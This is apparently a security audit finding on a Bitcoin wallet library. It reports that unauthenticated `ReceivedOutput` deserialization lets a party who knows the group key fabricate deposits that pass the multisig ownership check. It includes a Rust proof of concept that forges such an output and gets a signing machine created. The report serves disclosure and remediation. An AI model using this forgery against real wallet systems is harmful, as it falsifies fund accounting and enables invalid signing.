### Title
Unauthenticated `ReceivedOutput` deserialization permits fabricated deposits and invalid spends - (File: networks/bitcoin/src/wallet/mod.rs)

### Summary
`ReceivedOutput::read` accepts an offset, `TxOut`, and `OutPoint` as independent serialized fields without authenticating that the claimed `TxOut` exists at the claimed outpoint. [1](#0-0) [2](#0-1) 

This permits an unprivileged party who knows the group key to report an arbitrarily valuable output as received, and to cause a signing machine to be created for a transaction whose input is nonexistent or whose claimed value does not match the chain. [3](#0-2) [4](#0-3) 

### Finding Description
A legitimate `ReceivedOutput` is normally produced only after `Scanner::scan_transaction` observes an actual transaction output whose `script_pubkey` matches a registered scanner script. [5](#0-4) 

The serialized representation does not preserve that provenance: `ReceivedOutput::read` only requires a canonical scalar and syntactically decodable `TxOut` and `OutPoint`. [2](#0-1) 

An attacker can select an offset `x`, compute `P = K + xG` for the known group key `K`, and encode a P2TR script for `P` with `p2tr_script_buf`. [6](#0-5) 

`SignableTransaction::new` then trusts the decoded output’s claimed value and outpoint when constructing the transaction inputs and stored `prevouts`. [3](#0-2) [7](#0-6) 

`SignableTransaction::multisig` performs an ownership check, but that check only verifies that `keys.group_key() + offset*G` produces the supplied script; it does not verify that the referenced UTXO exists or contains the supplied value. [4](#0-3) 

### Impact Explanation
This is an improper-authorization analog because a party with no wallet authority can submit bytes describing a deposit and have them treated as a spendable deposit belonging to the multisig. [2](#0-1) 

The attacker can fabricate an outpoint entirely or point to a real low-value output while serializing a different, high-value `TxOut` for the same spendable-looking script. [1](#0-0) 

Downstream accounting can therefore report funds as received even though the claimed UTXO is absent or does not contain the claimed amount, and downstream signing can authorize a transaction that consensus will reject. [8](#0-7) [4](#0-3) 

### Likelihood Explanation
The required input is only untrusted bytes supplied to `ReceivedOutput::read`, plus knowledge of the public group key. [2](#0-1) 

Choosing a usable offset requires only incrementing the scalar until `p2tr_script_buf(K + offset*G)` returns an even-Y Taproot script. [6](#0-5) 

No discrete-logarithm solution or validator cooperation is required because the attacker chooses both the offset and the script to satisfy the later ownership comparison. [4](#0-3) 

### Recommendation
Do not expose `ReceivedOutput::read` as an authority-preserving reconstruction API for untrusted input, or bind each decoded object to authenticated scanner state and verified chain membership before accepting it. [2](#0-1) 

At minimum, `SignableTransaction::new` or `multisig` should require the caller to supply chain-authenticated UTXOs and verify that the actual outpoint resolves to the exact serialized `TxOut`, rather than relying solely on the derived script. [3](#0-2) [4](#0-3) 

### Proof of Concept
The following test-shaped example encodes an arbitrary `TxOut` and `OutPoint`; it requires only public crate APIs and the group key.

```rust
// networks/bitcoin/src/wallet/send.rs and networks/bitcoin/src/wallet/mod.rs APIs
use bitcoin::{
  consensus::serialize,
  Amount, OutPoint, TxOut,
};
use k256::{ProjectivePoint, Scalar};
use bitcoin_serai::wallet::{p2tr_script_buf, ReceivedOutput};
use bitcoin_serai::wallet::send::SignableTransaction;

let group_key = keys.group_key();

// Choose an offset for which K + offset*G has an even-Y P2TR encoding.
let mut offset = Scalar::ONE;
let claimed_script = loop {
  if let Some(script) =
    p2tr_script_buf(group_key + (ProjectivePoint::GENERATOR * offset))
  {
    break script;
  }
  offset += Scalar::ONE;
};

// This can be any outpoint, including one that does not exist.
let claimed_outpoint = OutPoint::null();

// Claim an arbitrary value for that outpoint.
let claimed_output = TxOut {
  value: Amount::from_sat(1_000_000),
  script_pubkey: claimed_script.clone(),
};

// Encode exactly as ReceivedOutput::write does:
// scalar || consensus TxOut || consensus OutPoint.
let mut encoded = offset.to_bytes().to_vec();
encoded.extend(serialize(&claimed_output));
encoded.extend(serialize(&claimed_outpoint));

let forged = ReceivedOutput::read(&mut encoded.as_slice()).unwrap();

// The fabricated value is trusted for funding calculations and prevouts.
let signable = SignableTransaction::new(
  vec![forged],
  &[(claimed_script, 10_000)],
  None,
  None,
  1,
)
.unwrap();

// The ownership check passes because the attacker chose offset/script together.
let machine = signable.multisig(&keys);
assert!(machine.is_some());
```

The resulting transaction commits to the fabricated `prevouts` and outpoint, so it cannot spend funds that are not actually present on-chain despite the decoded output being treated as received and eligible for signing. [9](#0-8)

### Citations

**File:** networks/bitcoin/src/wallet/mod.rs (L80-86)
```rust
pub fn p2tr_script_buf(key: ProjectivePoint) -> Option<ScriptBuf> {
  if key.to_encoded_point(true).tag() != Tag::CompressedEvenY {
    return None;
  }

  Some(ScriptBuf::new_p2tr_tweaked(TweakedPublicKey::dangerous_assume_tweaked(x_only(&key))))
}
```

**File:** networks/bitcoin/src/wallet/mod.rs (L90-97)
```rust
pub struct ReceivedOutput {
  // The scalar offset to obtain the key usable to spend this output.
  offset: Scalar,
  // The output to spend.
  output: TxOut,
  // The TX ID and vout of the output to spend.
  outpoint: OutPoint,
}
```

**File:** networks/bitcoin/src/wallet/mod.rs (L122-133)
```rust
  pub fn read<R: Read>(r: &mut R) -> io::Result<ReceivedOutput> {
    let offset = Secp256k1::read_F(r)?;
    let output;
    let outpoint;
    {
      let mut buf_r = BufReader::with_capacity(0, r);
      output =
        TxOut::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid TxOut"))?;
      outpoint =
        OutPoint::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid OutPoint"))?;
    }
    Ok(ReceivedOutput { offset, output, outpoint })
```

**File:** networks/bitcoin/src/wallet/mod.rs (L198-214)
```rust
  /// Scan a transaction.
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
      }
    }
    res
  }
```

**File:** networks/bitcoin/src/wallet/send.rs (L137-141)
```rust
  /// Returns the fee this transaction will use.
  pub fn fee(&self) -> u64 {
    self.prevouts.iter().map(|prevout| prevout.value.to_sat()).sum::<u64>() -
      self.tx.output.iter().map(|prevout| prevout.value.to_sat()).sum::<u64>()
  }
```

**File:** networks/bitcoin/src/wallet/send.rs (L175-184)
```rust
    let input_sat = inputs.iter().map(|input| input.output.value.to_sat()).sum::<u64>();
    let offsets = inputs.iter().map(|input| input.offset).collect();
    let tx_ins = inputs
      .iter()
      .map(|input| TxIn {
        previous_output: input.outpoint,
        script_sig: ScriptBuf::new(),
        sequence: Sequence::MAX,
        witness: Witness::new(),
      })
```

**File:** networks/bitcoin/src/wallet/send.rs (L245-254)
```rust
    Ok(SignableTransaction {
      tx: Transaction {
        version: Version(2),
        lock_time: LockTime::ZERO,
        input: tx_ins,
        output: tx_outs,
      },
      offsets,
      prevouts: inputs.drain(..).map(|input| input.output).collect(),
      needed_fee,
```

**File:** networks/bitcoin/src/wallet/send.rs (L273-282)
```rust
  pub fn multisig(self, keys: &ThresholdKeys<Secp256k1>) -> Option<TransactionMachine> {
    let mut sigs = vec![];
    for i in 0 .. self.tx.input.len() {
      let offset = keys.clone().offset(self.offsets[i]);
      if p2tr_script_buf(offset.group_key())? != self.prevouts[i].script_pubkey {
        None?;
      }

      sigs.push(AlgorithmMachine::new(Schnorr::new(), keys.clone().offset(self.offsets[i])));
    }
```

**File:** networks/bitcoin/src/wallet/send.rs (L373-390)
```rust
    let mut cache = SighashCache::new(&self.tx.tx);
    // Sign committing to all inputs
    let prevouts = Prevouts::All(&self.tx.prevouts);

    let mut shares = Vec::with_capacity(self.sigs.len());
    let sigs = self
      .sigs
      .drain(..)
      .enumerate()
      .map(|(i, sig)| {
        let (sig, share) = sig.sign(
          commitments[i].clone(),
          cache
            .taproot_key_spend_signature_hash(i, &prevouts, TapSighashType::Default)
            // This should never happen since the inputs align with the TX the cache was
            // constructed with, and because i is always < prevouts.len()
            .expect("taproot_key_spend_signature_hash failed to return a hash")
            .as_ref(),
```
